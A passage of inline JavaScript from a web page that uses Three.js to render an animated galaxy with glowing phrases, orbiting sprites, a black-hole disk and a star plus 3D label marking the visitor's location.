                    const glowMaterial1 = new THREE.MeshBasicMaterial({
                        color: 0xff5d8f,
                        transparent: true,
                        opacity: 0.25,
                        blending: THREE.AdditiveBlending,
                        depthTest: false,
                        depthWrite: false
                    });
                    const glowMesh1 = new THREE.Mesh(geometry, glowMaterial1);
                    glowMesh1.position.copy(mesh.position);
                    glowMesh1.rotation.copy(mesh.rotation);
                    glowMesh1.scale.multiplyScalar(1.12);
                    glowMesh1.renderOrder = 998;
                    scene.add(glowMesh1);
                    state.centerTextGlow = glowMesh1;
                    
                    const glowMaterial2 = new THREE.MeshBasicMaterial({
                        color: 0xf4c76b,
                        transparent: true,
                        opacity: 0.15,
                        blending: THREE.AdditiveBlending,
                        depthTest: false,
                        depthWrite: false
                    });
                    const glowMesh2 = new THREE.Mesh(geometry, glowMaterial2);
                    glowMesh2.position.copy(mesh.position);
                    glowMesh2.rotation.copy(mesh.rotation);
                    glowMesh2.scale.multiplyScalar(1.2);
                    glowMesh2.renderOrder = 997;
                    scene.add(glowMesh2);
                },
                undefined,
                () => console.warn('No se pudo cargar la fuente 3D')
            );
        };

        const createGalaxyPhrases = () => {
            const galaxyGroup = new THREE.Group();
            const phraseTexW = state.isLowPower ? 1100 : 2400;
            const phraseTexH = state.isLowPower ? 180 : 360;
            
            const createPhraseTexture = (text) => {
                const canvas = document.createElement('canvas');
                canvas.width = phraseTexW;
                canvas.height = phraseTexH;
                const ctx = canvas.getContext('2d');
                
                ctx.shadowColor = 'rgba(255,255,255,0.95)';
                ctx.shadowBlur = state.isLowPower ? 35 : 70;
                ctx.shadowOffsetX = 0;
                ctx.shadowOffsetY = 0;
                
                const gradient = ctx.createLinearGradient(0, 0, phraseTexW, 0);
                gradient.addColorStop(0, '#ffdd88');
                gradient.addColorStop(0.3, '#ffffff');
                gradient.addColorStop(0.7, '#ffffff');
                gradient.addColorStop(1, '#ff88aa');
                
                const fontSize = Math.round(phraseTexH * 0.45);
                ctx.font = `bold ${fontSize}px 'Segoe UI', Arial, sans-serif`;
                ctx.fillStyle = gradient;
                ctx.textAlign = 'center';
                ctx.textBaseline = 'middle';
                ctx.fillText(text, phraseTexW / 2, phraseTexH / 2);
                
                ctx.shadowColor = 'rgba(255,93,143,0.4)';
                ctx.shadowBlur = state.isLowPower ? 20 : 40;
                ctx.fillText(text, phraseTexW / 2, phraseTexH / 2);
                
                return new THREE.CanvasTexture(canvas);
            };
            
            const armSlots = CONFIG.galaxy.phraseCount / CONFIG.galaxy.arms;
            
            for (let i = 0; i < CONFIG.galaxy.phraseCount; i++) {
                const phrase = CONFIG.galaxy.phrases[i % CONFIG.galaxy.phrases.length];
                const texture = createPhraseTexture(phrase);
                texture.minFilter = THREE.LinearFilter;
                texture.magFilter = THREE.LinearFilter;
                
                const sprite = new THREE.Sprite(new THREE.SpriteMaterial({
                    map: texture,
                    transparent: true,
                    blending: THREE.NormalBlending,
                    depthTest: true,
                    depthWrite: false
                }));
                
                const angle = (i % armSlots) * (Math.PI * 2 / armSlots);
                const armAngle = Math.floor(i / armSlots) * (Math.PI * 2 / CONFIG.galaxy.arms);
                const distance = 80 + Math.pow(i / CONFIG.galaxy.phraseCount, 0.8) * (CONFIG.galaxy.radius - 80);
                
                sprite.position.set(
                    Math.cos(angle + armAngle) * distance,
                    (Math.random() - 0.5) * 80,
                    Math.sin(angle + armAngle) * distance
                );
                
                const baseScale = state.isLowPower ? 80 : 100;
                sprite.scale.set(baseScale, baseScale * 0.22, 1);
                sprite.userData = { baseScale, index: i };
                galaxyGroup.add(sprite);
            }
            
            return galaxyGroup;
        };

        const createOrbitSprites = () => {
            const orbitGroup = new THREE.Group();
            const orbitCount = state.isLowPower ? 8 : CONFIG.galaxy.orbitSpriteCount;
            
            new THREE.TextureLoader().load(
                CONFIG.galaxy.orbitSpriteUrl,
                (texture) => {
                    for (let i = 0; i < orbitCount; i++) {
                        const sprite = new THREE.Sprite(new THREE.SpriteMaterial({
                            map: texture,
                            transparent: true,
                            depthWrite: false,
                            blending: THREE.AdditiveBlending,
                            opacity: 0.8
                        }));
                        
                        const radius = 180 + Math.random() * 500;
                        sprite.userData = {
                            angle: Math.random() * Math.PI * 2,
                            radius,
                            speed: 0.15 + Math.random() * 0.5,
                            height: (Math.random() - 0.5) * 150,
                            verticalSpeed: 0.02 + Math.random() * 0.08
                        };
                        
                        const s = 50 + Math.random() * 70;
                        sprite.scale.set(s, s, 1);
                        sprite.position.set(
                            Math.cos(sprite.userData.angle) * radius,
                            sprite.userData.height,
                            Math.sin(sprite.userData.angle) * radius
                        );
                        
                        orbitGroup.add(sprite);
                    }
                },
                undefined,
                () => console.warn('No se pudo cargar el sprite orbitante')
            );
            
            return orbitGroup;
        };

        // ==================== ESTRELLA DE UBICACIÓN ====================
        const createLocationStar = (lat, lon) => {
            const { radius, sphereRadius, glowRadius, ringInner, ringOuter, particleCount } = CONFIG.location.star;
            const theta = (lon / 180) * Math.PI;
            const phi = (lat / 90) * Math.PI / 2;
            
            const x = radius * Math.cos(theta) * Math.cos(phi);
            const y = radius * Math.sin(phi) * 20;
            const z = radius * Math.sin(theta) * Math.cos(phi);
            
            const starGroup = new THREE.Group();
            starGroup.position.set(x, y + 50, z);
            
            const star = new THREE.Mesh(
                new THREE.SphereGeometry(sphereRadius, 16, 16),
                new THREE.MeshStandardMaterial({
                    color: 0xff5d8f,
                    emissive: 0xff5d8f,
                    emissiveIntensity: 3,
                    metalness: 0.1,
                    roughness: 0.1
                })
            );
            star.castShadow = true;
            starGroup.add(star);
            
            const glow = new THREE.Mesh(
                new THREE.SphereGeometry(glowRadius, 16, 16),
                new THREE.MeshBasicMaterial({
                    color: 0xff5d8f,
                    transparent: true,
                    opacity: 0.3,
                    blending: THREE.AdditiveBlending
                })
            );
            starGroup.add(glow);
            
            const ring = new THREE.Mesh(
                new THREE.RingGeometry(ringInner, ringOuter, 64),
                new THREE.MeshBasicMaterial({
                    color: 0xf4c76b,
                    transparent: true,
                    opacity: 0.6,
                    side: THREE.DoubleSide,
                    blending: THREE.AdditiveBlending
                })
            );
            ring.rotation.x = Math.PI / 2;
            starGroup.add(ring);
            
            const particleGeo = new THREE.BufferGeometry();
            const particlePos = new Float32Array(particleCount * 3);
            for (let i = 0; i < particleCount; i++) {
                const angle = (i / particleCount) * Math.PI * 2;
                const r = 25 + Math.random() * 15;
                particlePos[i * 3] = Math.cos(angle) * r;
                particlePos[i * 3 + 1] = (Math.random() - 0.5) * 20;
                particlePos[i * 3 + 2] = Math.sin(angle) * r;
            }
            particleGeo.setAttribute('position', new THREE.BufferAttribute(particlePos, 3));
            
            starGroup.add(new THREE.Points(particleGeo, new THREE.PointsMaterial({
                color: 0xf4c76b,
                size: 1.5,
                blending: THREE.AdditiveBlending,
                transparent: true,
                opacity: 0.8
            })));
            
            starGroup.userData = { isLocationStar: true, phase: Math.random() * Math.PI * 2 };
            scene.add(starGroup);
            
            return starGroup;
        };

        const createLocationText = async (lat, lon) => {
            const detailedLocation = await getDetailedLocation(lat, lon);
            const fontLoader = new FontLoader();
            
            fontLoader.load(
                CONFIG.galaxy.fontUrl,
                (font) => {
                    const text = `📍 ${detailedLocation}`;
                    const { size, height, curveSegments, bevelThickness, bevelSize, bevelSegments } = CONFIG.location.text;
                    
                    const geometry = new TextGeometry(text, {
                        font,
                        size,
                        height,
                        curveSegments,
                        bevelEnabled: true,
                        bevelThickness,
                        bevelSize,
                        bevelSegments
                    });
                    
                    geometry.computeBoundingBox();
                    const bb = geometry.boundingBox;
                    const xOffset = -0.5 * (bb.max.x - bb.min.x);
                    
                    const material = new THREE.MeshStandardMaterial({
                        color: 0xf4c76b,
                        emissive: 0xf4c76b,
                        emissiveIntensity: 0.8,
                        metalness: 0.3,
                        roughness: 0.2
                    });
                    
                    const mesh = new THREE.Mesh(geometry, material);
                    const { radius } = CONFIG.location.star;
                    const theta = (lon / 180) * Math.PI;
                    const phi = (lat / 90) * Math.PI / 2;
                    
                    mesh.position.set(
                        radius * Math.cos(theta) * Math.cos(phi) + xOffset,
                        50 + radius * Math.sin(phi) * 20 + 30,
                        radius * Math.sin(theta) * Math.cos(phi)
                    );
                    mesh.rotation.set(-Math.PI / 6, Math.PI / 4, 0);
                    mesh.scale.set(1.2, 1.2, 1.2);
                    scene.add(mesh);
                    
                    const glowMesh = new THREE.Mesh(geometry, new THREE.MeshBasicMaterial({
                        color: 0xff5d8f,
                        transparent: true,
                        opacity: 0.15,
                        blending: THREE.AdditiveBlending,
                        depthTest: false
                    }));
                    glowMesh.position.copy(mesh.position);
                    glowMesh.rotation.copy(mesh.rotation);
                    glowMesh.scale.multiplyScalar(1.1);
                    scene.add(glowMesh);
                },
                undefined,
                () => console.warn('No se pudo cargar la fuente')
            );
        };

        // ==================== INICIALIZACIÓN DE LA ESCENA ====================
        const nebula = createNebula();
        scene.add(nebula);
        
        const blackHoleGroup = createBlackHole();
        scene.add(blackHoleGroup);
        
        const accretionDisk = createAccretionDisk(
            CONFIG.scene.accretionDisk.innerRadius,
            CONFIG.scene.accretionDisk.outerRadius,
            0xff5d8f,
            1
        );
        accretionDisk.rotation.x = Math.PI / 2;
        scene.add(accretionDisk);
        
        const accretionDisk2 = createAccretionDisk(50, 140, 0xf4c76b, 0.4);
        accretionDisk2.rotation.x = Math.PI / 2 + 0.1;
        accretionDisk2.rotation.y = 0.2;
        scene.add(accretionDisk2);
        
        createCentralText();
        
        const galaxyGroup = createGalaxyPhrases();
        scene.add(galaxyGroup);
        
        const stars = createStars();
        scene.add(stars);
        
        const sparkles = createSparkles();
        scene.add(sparkles);
        
        const lights = createLighting();
        
        const orbitGroup = createOrbitSprites();
        scene.add(orbitGroup);

        // ==================== INICIALIZAR UBICACIÓN ====================
        const setupGalaxyLocation = async () => {
            console.log('🌌 Esperando ubicación...');
            let attempts = 0;
            while (!state.userLocation && attempts < 30) {
                await new Promise(resolve => setTimeout(resolve, 500));
                attempts++;
            }
            if (state.userLocation) {
                console.log('⭐ Creando estrella de ubicación');
                createLocationStar(state.userLocation.latitude, state.userLocation.longitude);
                await createLocationText(state.userLocation.latitude, state.userLocation.longitude);
            } else {
                console.log('❌ Sin ubicación para crear estrella');
            }
        };
        
        setTimeout(setupGalaxyLocation, 2000);

        // ==================== ANIMACIÓN ====================
        const clock = new THREE.Clock();
        
        const animate = () => {
            if (!state.isRunning) return;
            state.rafId = requestAnimationFrame(animate);
            
            const delta = clock.getDelta();
            const elapsed = clock.getElapsedTime();
            
            if (!state.reduceMotion) {
                galaxyGroup.rotation.y = elapsed * 0.012;
                accretionDisk.rotation.z += 0.0015;
                accretionDisk2.rotation.z -= 0.001;
                nebula.rotation.y += 0.0001;
                nebula.rotation.x += 0.00005;
                sparkles.rotation.y += 0.0003;
                sparkles.rotation.x += 0.0002;
                
                galaxyGroup.children.forEach((sprite, i) => {
                    const baseScale = sprite.userData.baseScale ?? 90;
                    const scale = baseScale + Math.sin(elapsed * 2 + i) * 10;
                    sprite.scale.set(scale, scale * 0.22, 1);
                    sprite.material.opacity = 0.8 + Math.sin(elapsed * 3 + i) * 0.2;
                });
                
                orbitGroup.children.forEach((sprite, i) => {
                    sprite.userData.angle += sprite.userData.speed * delta;
                    sprite.userData.height += Math.sin(elapsed * 0.5 + i) * 0.3;
                    sprite.position.set(
                        Math.cos(sprite.userData.angle) * sprite.userData.radius,
                        sprite.userData.height,
                        Math.sin(sprite.userData.angle) * sprite.userData.radius
                    );
                    sprite.quaternion.copy(camera.quaternion);
                    const s = 50 + 70 * (0.5 + 0.5 * Math.sin(elapsed + i));
                    sprite.scale.set(s, s, 1);
                    sprite.material.opacity = 0.5 + 0.4 * Math.abs(Math.sin(elapsed * 0.7 + i));
                });
                
                if (state.centerTextMesh && state.centerTextGlow) {
                    const pulse = 0.5 + 0.5 * Math.abs(Math.sin(elapsed * 2.2));
                    state.centerTextMesh.material.emissiveIntensity = 1.2 + pulse * 1.2;
                    state.centerTextGlow.material.opacity = 0.15 + pulse * 0.2;
                    const baseScale = 1.0 + 0.03 * Math.sin(elapsed * 1.6);
                    state.centerTextMesh.scale.set(baseScale, baseScale, baseScale);
                    state.centerTextGlow.scale.set(baseScale * 1.12, baseScale * 1.12, baseScale * 1.12);
                }
                
                lights.light1.intensity = 1.5 + 0.8 * Math.sin(elapsed * 1.5);
                lights.light2.intensity = 1.2 + 0.6 * Math.cos(elapsed * 1.8);
            }
            
            controls.update();
            renderer.render(scene, camera);
        };
        
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                state.isRunning = false;
                if (state.rafId) cancelAnimationFrame(state.rafId);
            } else if (!state.isRunning) {
                state.isRunning = true;
                clock.getDelta();
                animate();
            }
        });
        
        animate();
    </script>
</body>
</html>
